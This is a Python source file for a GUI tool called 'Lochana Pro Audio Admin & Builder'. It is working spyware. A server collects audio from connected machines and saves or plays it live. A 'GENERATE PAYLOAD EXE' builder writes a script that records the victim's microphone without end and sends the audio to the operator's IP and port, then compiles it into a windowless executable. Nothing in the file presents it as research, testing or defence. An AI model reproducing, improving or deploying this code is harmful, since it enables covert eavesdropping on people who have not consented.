import sys, socket, threading, wave, os, time, pygame, subprocess, json
from PyQt6.QtWidgets import (QApplication, QMainWindow, QPushButton, QVBoxLayout, 
                             QLabel, QWidget, QListWidget, QTabWidget, QGridLayout, 
                             QScrollArea, QFrame, QHBoxLayout, QLineEdit, QMessageBox, QCheckBox)
from PyQt6.QtCore import pyqtSignal, QObject, Qt

# --- Configuration Management ---
CONFIG_FILE = "settings.json"

def save_settings(ip, port, auto_rec):
    with open(CONFIG_FILE, "w") as f:
        json.dump({"ip": ip, "port": port, "auto_rec": auto_rec}, f)

def load_settings():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f)
        except: pass
    return {"ip": "127.0.0.1", "port": "65432", "auto_rec": False}

class ServerSignals(QObject):
    update_ui = pyqtSignal(dict)
    update_dash_log = pyqtSignal(str)
    update_build_log = pyqtSignal(str)
    build_done = pyqtSignal(str)

class ClientCard(QFrame):
    def __init__(self, ip, hostname, auto_start_rec=False):
        super().__init__()
        self.ip, self.hostname = ip, hostname
        self.is_recording = auto_start_rec
        self.is_live = False
        self.setup_ui()

    def setup_ui(self):
        self.setMinimumHeight(350)
        self.setStyleSheet("background-color: #2c3e50; border-radius: 15px; padding: 20px; margin: 10px; border: 1px solid #34495e;")
        layout = QVBoxLayout(self)
        
        icon_lbl = QLabel("💻")
        icon_lbl.setStyleSheet("font-size: 50px; border: none;")
        icon_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)

        name_lbl = QLabel(f"{self.hostname}\n{self.ip}")
        name_lbl.setStyleSheet("font-weight: bold; color: white; font-size: 15px; border: none;")
        name_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.btn_rec = QPushButton()
        self.btn_live = QPushButton()

        layout.addWidget(icon_lbl); layout.addStretch(); layout.addWidget(name_lbl)
        layout.addSpacing(20); layout.addWidget(self.btn_rec); layout.addWidget(self.btn_live)
        
        self.btn_rec.clicked.connect(self.toggle_rec)
        self.btn_live.clicked.connect(self.toggle_live)
        self.update_styles()

    def toggle_rec(self):
        self.is_recording = not self.is_recording
        self.update_styles()

    def toggle_live(self):
        self.is_live = not self.is_live
        self.update_styles()

    def update_styles(self):
        self.btn_rec.setText(f"REC: {'ON' if self.is_recording else 'OFF'}")
        self.btn_rec.setStyleSheet(f"background-color: {'#e74c3c' if self.is_recording else '#34495e'}; color: white; padding: 10px; font-weight: bold; border-radius: 8px;")
        self.btn_live.setText(f"LIVE: {'ON' if self.is_live else 'OFF'}")
        self.btn_live.setStyleSheet(f"background-color: {'#27ae60' if self.is_live else '#34495e'}; color: white; padding: 10px; font-weight: bold; border-radius: 8px;")

class MainSystem(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Lochana Pro Audio Admin & Builder")
        self.resize(1100, 750)
        self.client_widgets = {}
        self.running = True
        self.signals = ServerSignals()
        pygame.mixer.init()
        
        self.setup_ui()
        threading.Thread(target=self.start_server, daemon=True).start()

    def setup_ui(self):
        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)

        # --- Dashboard Tab ---
        dash_widget = QWidget(); dash_layout = QHBoxLayout(dash_widget)
        self.grid_layout = QGridLayout(); scroll_widget = QWidget(); scroll_widget.setLayout(self.grid_layout)
        scroll = QScrollArea(); scroll.setWidgetResizable(True); scroll.setStyleSheet("border: none; background-color: transparent;")
        scroll.setWidget(scroll_widget)
        
        dash_log_panel = QVBoxLayout()
        conf = load_settings()
        
        # Auto-Record Checkbox  
        self.check_auto_rec = QCheckBox("Auto-Record New Connections")
        self.check_auto_rec.setChecked(conf.get('auto_rec', False))
        self.check_auto_rec.setStyleSheet("color: #e74c3c; font-weight: bold; font-size: 13px; margin-bottom: 10px;")
        
        # මෙන්න මෙතන තමයි අලුත් කොටස: Tick එක දාද්දි ලොග් එකට මැසේජ් එක යවන විදිය
        self.check_auto_rec.stateChanged.connect(self.log_auto_rec_status)
        
        dash_log_panel.addWidget(self.check_auto_rec)
        dash_log_panel.addWidget(QLabel("SYSTEM ACTIVITY LOG"))
        self.dash_log_list = QListWidget()
        self.dash_log_list.setStyleSheet("background-color: #121212; color: #00ff00; border: 1px solid #333; border-radius: 8px; font-family: Consolas; font-size: 11px;")
        dash_log_panel.addWidget(self.dash_log_list)
        
        dash_layout.addWidget(scroll, 70); dash_layout.addLayout(dash_log_panel, 30)

        # --- Settings & Builder Tab ---
        settings_widget = QWidget(); settings_layout = QVBoxLayout(settings_widget)
        settings_layout.setContentsMargins(100, 50, 100, 50); settings_layout.setAlignment(Qt.AlignmentFlag.AlignTop)

        self.ip_input = QLineEdit(conf['ip']); self.port_input = QLineEdit(conf['port'])
        btn_save = QPushButton("💾 SAVE ALL SETTINGS"); btn_save.clicked.connect(self.save_conf)
        self.btn_build = QPushButton("🔨 GENERATE PAYLOAD EXE"); self.btn_build.clicked.connect(self.build_exe)

        input_style = "background-color: #333; color: white; padding: 12px; border-radius: 5px; margin-bottom: 10px;"
        self.ip_input.setStyleSheet(input_style); self.port_input.setStyleSheet(input_style)
        btn_save.setStyleSheet("background-color: #f39c12; color: white; height: 45px; font-weight: bold; border-radius: 5px;")
        self.btn_build.setStyleSheet("background-color: #2980b9; color: white; height: 65px; font-weight: bold; margin-top: 30px; border-radius: 10px;")

        settings_layout.addWidget(QLabel("TARGET SERVER IP:")); settings_layout.addWidget(self.ip_input)
        settings_layout.addWidget(QLabel("TARGET PORT:")); settings_layout.addWidget(self.port_input)
        settings_layout.addWidget(btn_save); settings_layout.addWidget(self.btn_build)
        
        self.build_log_list = QListWidget(); self.build_log_list.setFixedHeight(180)
        self.build_log_list.setStyleSheet("background-color: #121212; color: #3498db; border: 1px solid #333; border-radius: 8px; font-family: Consolas; font-size: 11px;")
        settings_layout.addSpacing(20); settings_layout.addWidget(QLabel("BUILDER PROGRESS LOG")); settings_layout.addWidget(self.build_log_list)

        self.tabs.addTab(dash_widget, "Dashboard"); self.tabs.addTab(settings_widget, "Settings & Builder")
        self.setStyleSheet("background-color: #1a1a1a; color: white; font-family: Segoe UI;")
        
        self.signals.update_ui.connect(self.add_client)
        self.signals.update_dash_log.connect(lambda msg: self.dash_log_list.insertItem(0, f"[{time.strftime('%H:%M:%S')}] {msg}"))
        self.signals.update_build_log.connect(lambda msg: self.build_log_list.insertItem(0, f"[{time.strftime('%H:%M:%S')}] {msg}"))
        self.signals.build_done.connect(self.on_build_done)

    # Tick එකේ Status එක Log එකට දාන Function එක
    def log_auto_rec_status(self):
        status = "ENABLED" if self.check_auto_rec.isChecked() else "DISABLED"
        self.signals.update_dash_log.emit(f"Auto-Record Mode: {status}")

    def save_conf(self):
        save_settings(self.ip_input.text(), self.port_input.text(), self.check_auto_rec.isChecked())
        QMessageBox.information(self, "Success", "Settings saved!")

    def add_client(self, info):
        ip = info['ip']
        if ip not in self.client_widgets:
            is_auto = self.check_auto_rec.isChecked()
            card = ClientCard(ip, info['hostname'], auto_start_rec=is_auto)
            self.client_widgets[ip] = card
            idx = self.grid_layout.count()
            self.grid_layout.addWidget(card, idx // 3, idx % 3)
            log_msg = f"PC Connected: {ip}"
            if is_auto: log_msg += " [AUTO-REC TRIGGERED]"
            self.signals.update_dash_log.emit(log_msg)

    def start_server(self):
        if not os.path.exists("recordings"): os.makedirs("recordings")
        conf = load_settings()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('0.0.0.0', int(conf['port'])))
                s.listen(10)
                while self.running:
                    s.settimeout(1.0)
                    try:
                        conn, addr = s.accept()
                        if self.running:
                            self.signals.update_ui.emit({'ip': addr[0], 'hostname': f"PC-{addr[0].split('.')[-1]}"})
                            threading.Thread(target=self.handle_client, args=(conn, addr[0]), daemon=True).start()
                    except socket.timeout: continue
        except Exception as e: print(f"Server Error: {e}")

    def handle_client(self, conn, ip):
        with conn:
            all_data = b''
            while self.running:
                try:
                    chunk = conn.recv(16384); 
                    if not chunk: break
                    all_data += chunk
                except: break
            
            if all_data and self.running and ip in self.client_widgets:
                card = self.client_widgets[ip]
                if card.is_recording:
                    fld = f"recordings/{ip.replace('.', '_')}"
                    if not os.path.exists(fld): os.makedirs(fld)
                    existing = [f for f in os.listdir(fld) if f.startswith("rec_v_")]
                    path = f"{fld}/rec_v_{len(existing) + 1}.wav"
                    self.save_wav(path, all_data)
                    self.signals.update_dash_log.emit(f"Saved: {ip} -> rec_v_{len(existing) + 1}")
                
                if card.is_live:
                    tmp = f"live_{ip.replace('.','_')}.wav"
                    pygame.mixer.music.stop(); pygame.mixer.music.unload()
                    self.save_wav(tmp, all_data); pygame.mixer.music.load(tmp); pygame.mixer.music.play()

    def save_wav(self, name, data):
        try:
            with wave.open(name, 'wb') as wf:
                wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(44100); wf.writeframes(data)
        except: pass

    def build_exe(self):
        ip, port = self.ip_input.text(), self.port_input.text()
        self.btn_build.setEnabled(False)
        self.signals.update_build_log.emit("🔨 Building Payload EXE... (Wait 1 min)")
        
        def run_build():
            src = f"import socket, sounddevice as sd, time\ndef r():\n while True:\n  try:\n   c = sd.rec(int(10*44100),44100,1,'int16')\n   sd.wait()\n   with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:\n    s.settimeout(5);s.connect(('{ip}',{port}));s.sendall(c.tobytes())\n  except:time.sleep(5)\nr()"
            with open("temp_p.py", "w") as f: f.write(src)
            try:
                subprocess.check_call(["pyinstaller", "--noconsole", "--onefile", "temp_p.py"])
                self.signals.build_done.emit("ok")
            except: self.signals.build_done.emit("err")
            finally:
                if os.path.exists("temp_p.py"): os.remove("temp_p.py")

        threading.Thread(target=run_build, daemon=True).start()

    def on_build_done(self, status):
        self.btn_build.setEnabled(True)
        if status == "ok":
            self.signals.update_build_log.emit("✅ BUILD SUCCESS!")
            QMessageBox.information(self, "Success", "Payload EXE created in 'dist' folder!")
            os.startfile(os.path.join(os.getcwd(), "dist"))
        else:
            self.signals.update_build_log.emit("❌ BUILD FAILED!")

    def closeEvent(self, event):
        self.running = False; pygame.mixer.quit(); event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv); win = MainSystem(); win.show(); sys.exit(app.exec())